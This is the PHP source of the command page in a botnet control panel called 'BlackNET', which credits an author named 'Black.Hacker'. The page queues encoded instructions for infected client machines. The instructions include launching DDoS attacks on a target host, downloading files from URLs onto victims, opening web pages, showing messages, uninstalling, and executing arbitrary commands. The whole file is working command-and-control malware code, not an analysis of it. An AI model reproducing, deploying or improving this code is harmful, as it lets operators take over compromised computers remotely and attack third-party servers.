<?php
include 'session.php';
include 'classes/Clients.php';

function POST($file_name,$data){
    $data = isset($data) ? $data : "This is incorrect";
    $myfile = fopen($file_name, "w") or die("Unable to open file!");
    fwrite($myfile, $data);
    fclose($myfile);
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <link rel="shortcut icon" href="favico.png">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Botnet Coded By Black.Hacker">
    <meta name="author" content="Black.Hacker">
    <title>BlackNET - Execute Command</title>
    <?php include_once 'components/css.php'; ?>
    <style type="text/css">
    @media (min-width: 1200px) {
        .container{ max-width: 400px; }
    }
      .sticky{
        display: -webkit-box;
        display: -ms-flexbox;
        background-color: #e9ecef;
        height: 80px;
        right: 0;
        bottom: 0; 
        position: absolute;
        display: flex;
        width: 100%;
        flex-shrink: none;
      }
    </style>
  </head>
  <body id="page-top">
    <?php include_once 'components/header.php'; ?>
    <div id="wrapper">
      <div id="content-wrapper">
        <div class="container-fluid">
          <ol class="breadcrumb">
            <li class="breadcrumb-item">
              <a href="#">Command Menu</a>
            </li>
          </ol>
          <div class="card mb-3">
            <div class="card-header">
              <i class="fas fa-bolt"></i>
              Command Menu
            </div>
            <div class="card-body">
<?php

        if ($csrf != $_GET['csrf']) {
            echo '
            <div class="container"><div class="alert alert-danger">
                <span class="fa fa-times-circle"></span> CSRF Token is invalid.
                </div>
            </div>';
            die();
        }

        $client = new Clients;
        if (isset($_GET['client'])) {
            $clientHWD = implode(',', $_GET['client']);
        } else {
            echo '<div class="container"><div class="alert alert-danger"><span class="fa fa-times-circle"></span> You did not select a client to execute this command
                 <br> Please go back and choose a client. <br> <a href="index.php">BLACKNET Main Interface</a></div></div>';
            die();
        }


        $command = isset($_GET['command']) ? $_GET['command'] : "nocommand";
        switch ($command){
            case "nocommand":
              echo '<div class="container"><div class="alert alert-danger"><span class="fa fa-times-circle"></span> You did not select a command to execute on the target deveice 
         <br> Please go back and choose a command. <br> <a href="index.php">BLACKNET Main Interface</a></div></div>';
               break;

            case "uninstall":
                Send($clientHWD, "Uninstall");
                echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Client Has Been Removed</div></div>';
            break;

            case "ddosw":
                if ($_SERVER['REQUEST_METHOD'] == "POST"){
                    Send($clientHWD, "DDOSAttack|BN|Enable|BN|" . gethost($_POST['TargetURL']));   
                    echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                }
                menu("ddos_attack");
                break;
                
            case "uploadf":

                if ($_SERVER['REQUEST_METHOD'] == "POST")
                {
                    Send($clientHWD, "UploadFile|BN|" . $_POST['FileURL'] . "|BN|" . $_POST['Name']);
                    echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                }
                menu("upload");
                break;

            case "ping":
                Send($clientHWD, "Ping");
                echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                break;

            case "msgbox":
                if ($_SERVER['REQUEST_METHOD'] == "POST")
                {
                    Send($clientHWD, "PrintMessage|BN|" . $_POST['Content']);
                    echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                }
                menu("messagebox");
                break;

            case "openwp":
                if ($_SERVER['REQUEST_METHOD'] == "POST")
                {
                    Send($clientHWD, "OpenPage|BN|" . $_POST['Weburl']);
                    echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                }
                menu("openpage");

                break;

            case "close":
                    echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                    $client->updateStatus($clientHWD,"Offline");
                    Send($clientHWD, 'Close');
                break;


                case 'exec':
                        if ($_SERVER['REQUEST_METHOD'] == "POST"){   
                            Send($clientHWD, "Execute|BN|" . $_POST['command']);
                            echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                        }
                        menu("execute");  
                    break;

                default:
                    echo '<div class="container"><div class="alert alert-danger"><span class="fa fa-times-circle"></span> Incorrect Command !!</div></div>';
                    break;
            }

        function Send($USER, $Command){
            try {
                $client = new Clients;
                $client->updateCommands($USER, base64_encode(sanitizeInput($Command))); 
            } catch (Exception $e) {
                die($e->getMessage());
            }
        }

        function menu($menu_name){
            include "menus/".$menu_name.".html";
        }

        function gethost($url){
            $input = trim($url,"/");
            if(!preg_match("#^http(s)?://#", $input)){
                $input = "http://" . $input;
            }
            $urlParts = parse_url($input);
            $domain = preg_replace("/^www\./", '', $urlParts['host']);
            return gethostbyname($domain);
        }

        function sanitizeInput($value){
            $data = trim($value);
            $data = strip_tags($data);
            $data = htmlentities($data);
            $data = htmlspecialchars($data,ENT_QUOTES,'UTF-8');
            $data = filter_var($data,FILTER_SANITIZE_STRING);
            return $data;
        }

?>
        
              </div>
        </div>
      </div>
    </div>

    <?php include_once 'components/footer.php'; ?>
    <?php include_once 'components/js.php'; ?>
  </body>
</html>